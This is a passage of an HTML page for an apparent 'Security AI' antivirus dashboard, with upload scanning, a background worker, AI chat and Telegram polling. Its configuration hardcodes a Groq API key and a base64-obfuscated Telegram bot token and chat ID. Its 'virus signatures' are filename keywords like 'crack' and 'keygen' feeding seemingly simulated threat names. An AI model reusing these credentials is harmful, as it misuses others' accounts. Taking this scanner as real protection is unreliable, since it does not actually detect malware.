<!doctype html>
<html lang="vi">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DGVIKAKAZZZ Security AI</title>
  <script src="/_sdk/element_sdk.js"></script>
  <style>
    /* ============================================
       GLOBAL STYLES & RESET
       ============================================ */
    html, body {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #ffffff;
      overflow-x: hidden;
    }

    * {
      box-sizing: border-box;
    }

    /* ============================================
       LAYOUT COMPONENTS
       ============================================ */
    .main-wrapper {
      width: 100%;
      min-height: 100%;
      padding: 30px 20px;
    }

    .app-header {
      text-align: center;
      margin-bottom: 30px;
    }

    .app-header h1 {
      font-size: 38px;
      margin: 0 0 8px 0;
      background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      font-weight: 700;
    }

    .app-header p {
      color: #8892b0;
      margin: 0;
      font-size: 16px;
    }

    .content-container {
      max-width: 1400px;
      margin: 0 auto;
    }

    .dashboard-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 25px;
    }

    /* ============================================
       CARD COMPONENTS
       ============================================ */
    .status-card {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      padding: 25px;
      border: 1px solid rgba(0, 212, 255, 0.2);
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }

    .status-card:hover {
      border-color: rgba(0, 212, 255, 0.8);
      transform: translateY(-8px) scale(1.03);
      box-shadow: 0 15px 50px rgba(0, 212, 255, 0.4);
      background: linear-gradient(135deg, rgba(30, 41, 59, 0.95) 0%, rgba(0, 212, 255, 0.1) 100%);
    }

    .status-card:hover .card-icon {
      transform: scale(1.2) rotate(5deg);
      filter: drop-shadow(0 8px 20px rgba(0, 212, 255, 0.8));
    }

    .card-icon {
      font-size: 48px;
      margin-bottom: 12px;
      display: block;
      filter: drop-shadow(0 6px 12px rgba(0, 212, 255, 0.5));
      animation: float 3s ease-in-out infinite;
      transition: all 0.3s ease;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-5px); }
    }

    .card-label {
      font-size: 13px;
      color: #8892b0;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 8px;
    }

    .card-value {
      font-size: 32px;
      font-weight: 700;
      margin: 0;
      color: #00d4ff;
    }

    .card-value.danger {
      color: #ff4757;
    }

    .card-value.warning {
      color: #ffa502;
    }

    .card-value.success {
      color: #2ed573;
    }

    .scanner-panel, .monitor-panel, .threat-list-card {
      background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(22, 33, 62, 0.8) 100%);
      border-radius: 12px;
      padding: 30px;
      border: 1px solid rgba(0, 212, 255, 0.3);
      margin-bottom: 25px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }

    /* ============================================
       UPLOAD ZONE
       ============================================ */
    .upload-zone {
      border: 3px dashed rgba(0, 212, 255, 0.5);
      border-radius: 12px;
      padding: 50px 30px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.6) 0%, rgba(30, 41, 59, 0.6) 100%);
      margin-bottom: 25px;
      box-shadow: inset 0 2px 10px rgba(0, 212, 255, 0.1);
    }

    .upload-zone:hover {
      border-color: rgba(0, 212, 255, 1);
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.8) 100%);
      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3), inset 0 2px 10px rgba(0, 212, 255, 0.2);
      transform: scale(1.01);
    }

    .upload-zone.drag-over {
      border-color: #00d4ff;
      background: rgba(0, 212, 255, 0.1);
      transform: scale(1.02);
    }

    /* ============================================
       FILE QUEUE & ITEMS
       ============================================ */
    .file-queue {
      max-height: 300px;
      overflow-y: auto;
      margin-bottom: 25px;
    }

    .file-item {
      background: rgba(15, 23, 42, 0.7);
      padding: 15px 20px;
      margin-bottom: 10px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-left: 4px solid;
      animation: slideIn 0.3s ease;
    }

    .file-item.scanning {
      border-color: #ffa502;
    }

    .file-item.clean {
      border-color: #2ed573;
    }

    .file-item.infected {
      border-color: #ff4757;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .file-info {
      flex: 1;
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .file-icon {
      font-size: 28px;
    }

    .file-details {
      flex: 1;
    }

    .file-name {
      font-weight: 600;
      margin-bottom: 4px;
      font-size: 15px;
    }

    .file-size {
      font-size: 12px;
      color: #8892b0;
    }

    .file-status {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      font-weight: 600;
    }

    .scanning-spinner {
      width: 18px;
      height: 18px;
      border: 3px solid rgba(255, 165, 2, 0.3);
      border-top-color: #ffa502;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ============================================
       PROGRESS BAR
       ============================================ */
    .scan-progress {
      margin: 25px 0;
    }

    .progress-bar-container {
      width: 100%;
      height: 35px;
      background: rgba(15, 23, 42, 0.8);
      border-radius: 20px;
      overflow: hidden;
      position: relative;
      border: 1px solid rgba(0, 212, 255, 0.3);
    }

    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #00d4ff 0%, #0099ff 100%);
      width: 0%;
      transition: width 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 14px;
      color: white;
      position: relative;
    }

    .progress-bar::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      animation: shimmer 2s infinite;
    }

    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    .scan-status {
      text-align: center;
      margin-top: 15px;
      font-size: 15px;
      color: #8892b0;
      min-height: 20px;
    }

    /* ============================================
       BUTTONS
       ============================================ */
    button {
      padding: 14px 35px;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }

    .btn-scan {
      background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
      color: white;
    }

    .btn-scan:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
    }

    .btn-stop {
      background: linear-gradient(135deg, #ff4757 0%, #ff3838 100%);
      color: white;
    }

    .btn-stop:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 71, 87, 0.4);
    }

    .btn-clear {
      background: linear-gradient(135deg, #ffa502 0%, #ff6348 100%);
      color: white;
    }

    .btn-clear:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 165, 2, 0.4);
    }

    .btn-control {
      padding: 12px 20px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }

    .btn-control:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .control-buttons {
      display: flex;
      gap: 15px;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 25px;
    }

    /* ============================================
       THREAT COMPONENTS
       ============================================ */
    .threats-section {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
      gap: 20px;
    }

    .threat-list-card h2 {
      margin: 0 0 20px 0;
      font-size: 20px;
      color: #00d4ff;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .threat-list {
      max-height: 350px;
      overflow-y: auto;
    }

    .threat-item {
      background: rgba(15, 23, 42, 0.6);
      padding: 15px;
      margin-bottom: 12px;
      border-radius: 8px;
      border-left: 4px solid;
      animation: slideIn 0.3s ease;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .threat-item.critical {
      border-color: #ff4757;
    }

    .threat-item.high {
      border-color: #ffa502;
    }

    .threat-item.medium {
      border-color: #ffd700;
    }

    .threat-item.low {
      border-color: #2ed573;
    }

    .threat-info {
      flex: 1;
    }

    .threat-name {
      font-weight: 600;
      font-size: 15px;
      margin-bottom: 5px;
      color: #ffffff;
    }

    .threat-path {
      font-size: 12px;
      color: #8892b0;
      font-family: 'Courier New', monospace;
    }

    .threat-actions {
      display: flex;
      gap: 8px;
    }

    .btn-action {
      padding: 6px 14px;
      font-size: 13px;
      border-radius: 6px;
      background: rgba(0, 212, 255, 0.2);
      color: #00d4ff;
      border: 1px solid rgba(0, 212, 255, 0.4);
    }

    .btn-action:hover:not(:disabled) {
      background: rgba(0, 212, 255, 0.3);
      transform: none;
      box-shadow: none;
    }

    /* ============================================
       WORKER BADGE
       ============================================ */
    .worker-badge {
      display: inline-block;
      padding: 4px 10px;
      background: linear-gradient(135deg, #2ed573 0%, #26d07c 100%);
      color: white;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.5px;
      box-shadow: 0 2px 8px rgba(46, 213, 115, 0.3);
      animation: pulse 2s ease-in-out infinite;
    }

    .worker-badge.inactive {
      background: linear-gradient(135deg, #8892b0 0%, #64748b 100%);
      animation: none;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.6; transform: scale(1.2); }
    }

    .pulse-dot {
      width: 14px;
      height: 14px;
      background: #2ed573;
      border-radius: 50%;
      animation: pulse 2s ease-in-out infinite;
      box-shadow: 0 0 15px rgba(46, 213, 115, 0.8);
    }

    /* ============================================
       ALERT POPUP
       ============================================ */
    .alert-popup {
      position: fixed;
      top: 20px;
      right: 20px;
      max-width: 380px;
      background: rgba(15, 23, 42, 0.98);
      border: 2px solid #ff4757;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 10px 40px rgba(255, 71, 87, 0.5);
      animation: slideInRight 0.4s ease, shake 0.5s ease 0.4s;
      z-index: 9999;
      display: none;
    }

    .alert-popup.show {
      display: block;
    }

    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(400px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
      20%, 40%, 60%, 80% { transform: translateX(5px); }
    }

    .alert-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 12px;
    }

    .alert-icon {
      font-size: 32px;
      animation: rotate 2s linear infinite;
    }

    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .alert-title {
      font-size: 18px;
      font-weight: 700;
      color: #ff4757;
      margin: 0;
    }

    .alert-message {
      font-size: 14px;
      color: #ffffff;
      margin: 0 0 8px 0;
      line-height: 1.5;
    }

    .alert-time {
      font-size: 12px;
      color: #8892b0;
      margin: 0;
    }

    .close-alert {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: #8892b0;
      font-size: 20px;
      cursor: pointer;
      padding: 0;
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .close-alert:hover {
      color: #ffffff;
      transform: none;
      box-shadow: none;
    }

    /* ============================================
       ACTIVITY LOG
       ============================================ */
    .activity-log {
      max-height: 250px;
      overflow-y: auto;
      background: rgba(15, 23, 42, 0.5);
      border-radius: 8px;
      padding: 15px;
    }

    .activity-item {
      padding: 12px;
      margin-bottom: 10px;
      background: rgba(30, 41, 59, 0.6);
      border-radius: 6px;
      border-left: 3px solid;
      font-size: 13px;
      animation: slideIn 0.3s ease;
    }

    .activity-item.info {
      border-color: #00d4ff;
    }

    .activity-item.warning {
      border-color: #ffa502;
    }

    .activity-item.danger {
      border-color: #ff4757;
    }

    .activity-timestamp {
      color: #8892b0;
      font-size: 11px;
      margin-top: 4px;
    }

    /* ============================================
       EMPTY STATE
       ============================================ */
    .empty-state {
      text-align: center;
      padding: 40px 20px;
      color: #8892b0;
    }

    .empty-state-icon {
      font-size: 48px;
      margin-bottom: 15px;
      display: block;
    }

    /* ============================================
       SCROLLBAR CUSTOM
       ============================================ */
    .threat-list::-webkit-scrollbar,
    .file-queue::-webkit-scrollbar,
    .activity-log::-webkit-scrollbar {
      width: 8px;
    }

    .threat-list::-webkit-scrollbar-track,
    .file-queue::-webkit-scrollbar-track,
    .activity-log::-webkit-scrollbar-track {
      background: rgba(15, 23, 42, 0.5);
      border-radius: 4px;
    }

    .threat-list::-webkit-scrollbar-thumb,
    .file-queue::-webkit-scrollbar-thumb,
    .activity-log::-webkit-scrollbar-thumb {
      background: rgba(0, 212, 255, 0.5);
      border-radius: 4px;
    }

    .threat-list::-webkit-scrollbar-thumb:hover,
    .file-queue::-webkit-scrollbar-thumb:hover,
    .activity-log::-webkit-scrollbar-thumb:hover {
      background: rgba(0, 212, 255, 0.7);
    }

    /* ============================================
       RESPONSIVE
       ============================================ */
    @media (max-width: 768px) {
      .app-header h1 {
        font-size: 28px;
      }

      .dashboard-grid {
        grid-template-columns: 1fr;
      }

      .threats-section {
        grid-template-columns: 1fr;
      }

      .card-value {
        font-size: 26px;
      }

      .upload-zone {
        padding: 30px 20px;
      }
    }
  </style>
  <style>@view-transition { navigation: auto; }</style>
  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
  <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
 </head>
 <body>
  <div class="main-wrapper">
   <header class="app-header">
    <h1 id="app-title">DGVIKAKAZZZ Security AI</h1>
    <p>Modular Architecture - Clean Code Structure</p>
   </header>
   <main class="content-container"><!-- Worker Status Panel -->
    <div class="monitor-panel" style="border: 2px solid #2ed573;">
     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
      <div>
       <h2 style="margin: 0; color: #2ed573; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">ü§ñ Background Security Worker <span id="workerBadge" class="worker-badge inactive">INACTIVE</span></h2>
       <p style="margin: 5px 0 0 0; font-size: 13px; color: #8892b0;">Auto-scan every 30s - Non-blocking</p>
      </div>
      <div style="display: flex; gap: 10px; flex-wrap: wrap;"><button class="btn-control" id="toggleWorkerBtn" style="background: linear-gradient(135deg, #2ed573 0%, #26d07c 100%);"> Start Worker </button>
      </div>
     </div>
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: rgba(15, 23, 42, 0.7); padding: 20px; border-radius: 8px;">
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;">
        WORKER SCANS
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #2ed573;" id="workerScans">
        0
       </div>
      </div>
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;">
        AUTO THREATS
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #ff4757;" id="workerThreats">
        0
       </div>
      </div>
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;">
        STATUS
       </div>
       <div style="font-size: 16px; font-weight: 600; color: #8892b0;" id="workerStatusText">
        Not started
       </div>
      </div>
     </div>
    </div><!-- Dashboard Stats -->
    <div class="dashboard-grid">
     <div class="status-card"><span class="card-icon">‚ö†Ô∏è</span>
      <div class="card-label">
       Detected Viruses
      </div>
      <p class="card-value danger" id="virusCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">üìÅ</span>
      <div class="card-label">
       Files Scanned
      </div>
      <p class="card-value" id="scannedCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">‚úîÔ∏è</span>
      <div class="card-label">
       Clean Files
      </div>
      <p class="card-value success" id="cleanCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">üîê</span>
      <div class="card-label">
       Quarantined
      </div>
      <p class="card-value warning" id="quarantineCount">0</p>
     </div>
    </div><!-- Scanner Panel -->
    <div class="scanner-panel">
     <h2 style="margin: 0 0 20px 0; color: #00d4ff;"><span id="upload-title">Upload &amp; Auto Scan</span></h2>
     <div class="upload-zone" id="uploadZone"><input type="file" id="fileInput" multiple accept="*/*" style="display: none;">
      <div class="upload-content"><span style="font-size: 48px; display: block; margin-bottom: 15px;">üìÅ</span>
       <p style="margin: 0 0 10px 0; font-size: 18px; font-weight: 600;">Drag &amp; Drop or Click to Select</p>
       <p style="margin: 0; color: #8892b0; font-size: 14px;">Auto-scan on upload - Multiple files supported</p>
      </div>
     </div>
     <div class="file-queue" id="fileQueue"></div>
     <h2 style="margin: 30px 0 20px 0; color: #00d4ff;">System Scanner</h2>
     <div class="scan-progress">
      <div class="progress-bar-container">
       <div class="progress-bar" id="progressBar">
        0%
       </div>
      </div>
      <div class="scan-status" id="scanStatus">
       Ready to scan system
      </div>
     </div>
     <div class="control-buttons"><button class="btn-scan" id="scanBtn"> <span id="scan-button-text">Scan System Now</span> </button> <button class="btn-stop" id="stopBtn" disabled> <span id="stop-button-text">Stop Scan</span> </button> <button class="btn-clear" id="clearBtn"> Clear Quarantine </button>
     </div>
    </div><!-- AI Assistant Panel -->
    <div class="monitor-panel">
     <h2 style="margin: 0 0 20px 0; color: #00d4ff;">ü§ñ AI Security Assistant</h2>
     <div id="aiAnalysisPanel" style="background: rgba(15, 23, 42, 0.7); padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 2px solid #00d4ff;">
      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;"><span style="font-size: 24px;">ü§ñ</span>
       <h3 style="margin: 0; color: #00d4ff;">AI Analysis</h3>
       <div id="aiThinking" style="display: none; margin-left: auto;">
        <div class="scanning-spinner"></div>
       </div>
      </div>
      <div id="aiAnalysisContent" style="color: #ffffff; line-height: 1.8; font-size: 14px; max-height: 400px; overflow-y: auto; padding: 10px; background: rgba(30, 41, 59, 0.5); border-radius: 6px;">
       <div style="padding: 15px; background: rgba(46, 213, 115, 0.1); border-left: 4px solid #2ed573; border-radius: 6px;">
        <p style="margin: 0; color: #2ed573; font-weight: 600;">‚úÖ AI Ready!</p>
        <p style="margin: 8px 0 0 0; color: #8892b0; font-size: 13px;">Powered by GROQ - Created by DUONG VI</p>
       </div>
      </div><button class="btn-control" id="analyzeNow" style="margin-top: 15px; width: 100%;"> Analyze Security with AI </button>
     </div><!-- Real-time Monitoring -->
     <h3 style="margin: 0 0 15px 0; color: #00d4ff;">24/7 Real-time Monitoring</h3>
     <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
      <div style="display: flex; align-items: center; gap: 12px; font-size: 18px; font-weight: 600;">
       <div class="pulse-dot"></div><span id="monitorStatus">Monitoring active...</span>
      </div><button class="toggle-monitor" id="toggleMonitor" style="padding: 10px 25px; font-size: 15px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; background: linear-gradient(135deg, #2ed573 0%, #26d07c 100%); color: white;">Stop Monitoring</button>
     </div>
     <div class="activity-log" id="activityLog">
      <div style="text-align: center; color: #8892b0; padding: 20px;"><span style="font-size: 32px; display: block; margin-bottom: 10px;">üëÅÔ∏è</span>
       <p style="margin: 0;">Start monitoring to see activity...</p>
      </div>
     </div>
    </div><!-- AI Chat -->
    <div class="threat-list-card" style="margin-bottom: 25px;">
     <h2>üí¨ Chat with AI Security Expert</h2>
     <div id="aiChatbox" style="background: rgba(15, 23, 42, 0.7); border-radius: 12px; padding: 20px; border: 2px solid rgba(0, 212, 255, 0.3);">
      <div id="chatMessages" style="height: 350px; overflow-y: auto; margin-bottom: 15px; padding: 15px; background: rgba(30, 41, 59, 0.5); border-radius: 8px;">
       <div style="text-align: center; color: #8892b0; padding: 40px 20px;"><span style="font-size: 48px; display: block; margin-bottom: 15px;">ü§ñ</span>
        <p style="margin: 0; font-size: 16px; font-weight: 600; color: #00d4ff;">AI Security Assistant</p>
        <p style="margin: 8px 0 0 0; font-size: 14px;">Ask me anything about security, viruses, threats...</p>
       </div>
      </div>
      <form id="chatForm" style="display: flex; gap: 10px;"><input type="text" id="chatInput" placeholder="Ask AI about security, how to handle viruses..." style="flex: 1; padding: 12px 16px; background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(0, 212, 255, 0.4); border-radius: 8px; color: #ffffff; font-size: 14px;" required> <button type="submit" class="btn-control" style="padding: 12px 24px; margin: 0;"> Send </button>
      </form>
     </div>
    </div><!-- Threats Section -->
    <div class="threats-section">
     <div class="threat-list-card">
      <h2>Detected Threats</h2>
      <div class="threat-list" id="threatsList">
       <div class="empty-state"><span class="empty-state-icon">‚úÖ</span>
        <p>No threats detected</p>
       </div>
      </div>
     </div>
     <div class="threat-list-card">
      <h2>Quarantine Zone</h2>
      <div class="threat-list" id="quarantineList">
       <div class="empty-state"><span class="empty-state-icon">üõ°Ô∏è</span>
        <p>Quarantine zone empty</p>
       </div>
      </div>
     </div>
    </div>
   </main>
  </div><!-- Alert Popup -->
  <div class="alert-popup" id="alertPopup"><button class="close-alert" onclick="closeAlert()">‚úï</button>
   <div class="alert-header">
    <div class="alert-icon">
     üö®
    </div>
    <h3 class="alert-title">SECURITY ALERT!</h3>
   </div>
   <p class="alert-message" id="alertMessage"></p>
   <p class="alert-time" id="alertTime"></p>
  </div><!-- ============================================
       CONFIGURATION MODULE
       ============================================ -->
  <script>
    const CONFIG = {
      telegram: {
        botToken: atob('ODAzNTg2NTU0ODpBQUh3dDZQeHR0WEJJM0ZiNlR5dmVUSUx2dHNreVFEcTNJZw=='),
        chatId: '6415297481'
      },
      groq: {
        apiKey: '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',
        model: 'llama-3.3-70b-versatile'
      },
      scanner: {
        virusSignatures: [
          "trojan", "virus", "malware", "hack", "crack", "keygen", "worm", "backdoor",
          "ransomware", "spyware", "adware", "rootkit", "exploit", "payload"
        ],
        suspiciousExtensions: [
          ".exe", ".bat", ".cmd", ".vbs", ".js", ".jar", ".scr", ".com", ".pif"
        ],
        virusTypes: [
          { name: "Trojan.Win32.Generic", severity: "critical", icon: "‚ö†Ô∏è" },
          { name: "Ransomware.Cryptor", severity: "critical", icon: "üîê" },
          { name: "Worm.AutoRun", severity: "high", icon: "üêç" },
          { name: "Adware.PopupGen", severity: "medium", icon: "üí¨" },
          { name: "Spyware.Keylogger", severity: "high", icon: "üîë" },
          { name: "Malware.Downloader", severity: "high", icon: "‚¨áÔ∏è" }
        ]
      },
      worker: {
        scanInterval: 30000,
        threatDatabase: [
          { name: 'Suspicious Script Activity', severity: 'medium', desc: 'Unverified script detected' },
          { name: 'Tracking Cookie Detected', severity: 'low', desc: 'User tracking cookie' },
          { name: 'Unauthorized Network Request', severity: 'high', desc: 'Abnormal network request' },
          { name: 'DOM Manipulation Attempt', severity: 'medium', desc: 'DOM modification attempt' },
          { name: 'LocalStorage Overflow', severity: 'low', desc: 'LocalStorage too large' },
          { name: 'XSS Attack Pattern', severity: 'high', desc: 'XSS attack pattern' },
          { name: 'SQL Injection Attempt', severity: 'critical', desc: 'SQL Injection attempt' },
          { name: 'Crypto Mining Script', severity: 'high', desc: 'Hidden mining script' },
          { name: 'Keylogger Pattern', severity: 'critical', desc: 'Keylogger pattern' },
          { name: 'Phishing Redirect', severity: 'high', desc: 'Phishing page redirect' }
        ]
      }
    };
  </script><!-- ============================================
       STATE MANAGEMENT MODULE
       ============================================ -->
  <script>
    const AppState = {
      stats: {
        viruses: 0,
        scanned: 0,
        clean: 0,
        quarantined: 0
      },
      threats: [],
      quarantine: [],
      uploadedFiles: [],
      activityLog: [],
      chatMessages: [],
      worker: {
        active: false,
        scanCount: 0,
        threatsFound: 0,
        instance: null
      },
      monitoring: {
        active: true,
        interval: null
      },
      scanning: {
        isActive: false,
        progress: 0
      },
      telegram: {
        connected: false,
        pollingInterval: null,
        lastUpdateId: 0,
        processedCommands: new Set(),
        lastSentMessages: new Map()
      }
    };
  </script><!-- ============================================
       UTILITY FUNCTIONS MODULE
       ============================================ -->
  <script>
    const Utils = {
      formatFileSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
      },

      formatTime() {
        return new Date().toLocaleTimeString('vi-VN');
      },

      formatDateTime() {
        return new Date().toLocaleString('vi-VN');
      },

      sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      },

      debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }
    };
  </script><!-- ============================================
       UI UPDATE MODULE
       ============================================ -->
  <script>
    const UI = {
      updateStats() {
        document.getElementById('virusCount').textContent = AppState.stats.viruses;
        document.getElementById('scannedCount').textContent = AppState.stats.scanned;
        document.getElementById('cleanCount').textContent = AppState.stats.clean;
        document.getElementById('quarantineCount').textContent = AppState.stats.quarantined;
      },

      updateWorkerStats() {
        document.getElementById('workerScans').textContent = AppState.worker.scanCount;
        document.getElementById('workerThreats').textContent = AppState.worker.threatsFound;
      },

      updateWorkerStatus(active) {
        const badge = document.getElementById('workerBadge');
        const statusText = document.getElementById('workerStatusText');
        const btn = document.getElementById('toggleWorkerBtn');

        if (active) {
          badge.textContent = 'ACTIVE';
          badge.classList.remove('inactive');
          statusText.textContent = 'Running in background...';
          btn.textContent = 'Stop Worker';
          btn.style.background = 'linear-gradient(135deg, #ff4757 0%, #ff3838 100%)';
        } else {
          badge.textContent = 'INACTIVE';
          badge.classList.add('inactive');
          statusText.textContent = 'Stopped';
          btn.textContent = 'Start Worker';
          btn.style.background = 'linear-gradient(135deg, #2ed573 0%, #26d07c 100%)';
        }
      },

      updateProgress(percent, status) {
        const progressBar = document.getElementById('progressBar');
        const scanStatus = document.getElementById('scanStatus');
        progressBar.style.width = percent + '%';
        progressBar.textContent = Math.floor(percent) + '%';
        if (status) scanStatus.textContent = status;
      },

      renderFileQueue() {
        const container = document.getElementById('fileQueue');
        if (AppState.uploadedFiles.length === 0) {
          container.innerHTML = '';
          return;
        }

        container.innerHTML = AppState.uploadedFiles.map((file) => `
          <div class="file-item ${file.status}">
            <div class="file-info">
              <div class="file-icon">${file.icon}</div>
              <div class="file-details">
                <div class="file-name">${file.name}</div>
                <div class="file-size">${file.size}</div>
              </div>
            </div>
            <div class="file-status">
              ${file.status === 'scanning' ? '<div class="scanning-spinner"></div> Scanning...' : ''}
              ${file.status === 'clean' ? '‚úÖ Safe' : ''}
              ${file.status === 'infected' ? 'ü¶† Infected!' : ''}
            </div>
          </div>
        `).join('');
      },

      renderThreats() {
        const container = document.getElementById('threatsList');
        
        if (AppState.threats.length === 0) {
          container.innerHTML = `
            <div class="empty-state">
              <span class="empty-state-icon">‚úÖ</span>
              <p>No threats detected</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.threats.map((threat, index) => `
          <div class="threat-item ${threat.severity}">
            <div class="threat-info">
              <div class="threat-name">${threat.icon} ${threat.name}</div>
              <div class="threat-path">${threat.path}</div>
            </div>
            <div class="threat-actions">
              <button class="btn-action" onclick="Actions.quarantineThreat(${index})">Quarantine</button>
            </div>
          </div>
        `).join('');
      },

      renderQuarantine() {
        const container = document.getElementById('quarantineList');
        
        if (AppState.quarantine.length === 0) {
          container.innerHTML = `
            <div class="empty-state">
              <span class="empty-state-icon">üõ°Ô∏è</span>
              <p>Quarantine zone empty</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.quarantine.map(threat => `
          <div class="threat-item ${threat.severity}">
            <div class="threat-info">
              <div class="threat-name">${threat.icon} ${threat.name}</div>
              <div class="threat-path">${threat.path}</div>
            </div>
            <div class="threat-actions">
              <span style="color: #2ed573; font-size: 12px;">OK Quarantined</span>
            </div>
          </div>
        `).join('');
      },

      renderActivityLog() {
        const container = document.getElementById('activityLog');
        
        if (AppState.activityLog.length === 0) {
          container.innerHTML = `
            <div style="text-align: center; color: #8892b0; padding: 20px;">
              <span style="font-size: 32px; display: block; margin-bottom: 10px;">üëÅÔ∏è</span>
              <p style="margin: 0;">No activity yet</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.activityLog.map(log => `
          <div class="activity-item ${log.type}">
            <div>${log.message}</div>
            <div class="activity-timestamp">${log.timestamp}</div>
          </div>
        `).join('');
      },

      showAlert(message) {
        const alertPopup = document.getElementById('alertPopup');
        const alertMessage = document.getElementById('alertMessage');
        const alertTime = document.getElementById('alertTime');
        
        alertMessage.textContent = message;
        alertTime.textContent = `Detected at: ${Utils.formatTime()}`;
        
        alertPopup.classList.add('show');
        
        setTimeout(() => {
          alertPopup.classList.remove('show');
        }, 8000);
      },

      logActivity(message, type = 'info') {
        const timestamp = Utils.formatTime();
        AppState.activityLog.unshift({
          message,
          type,
          timestamp,
          id: Date.now()
        });
        
        if (AppState.activityLog.length > 50) {
          AppState.activityLog.pop();
        }
        
        this.renderActivityLog();
      },

      addChatMessage(role, content, isLoading = false) {
        const chatContainer = document.getElementById('chatMessages');
        const timestamp = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
        
        const messageDiv = document.createElement('div');
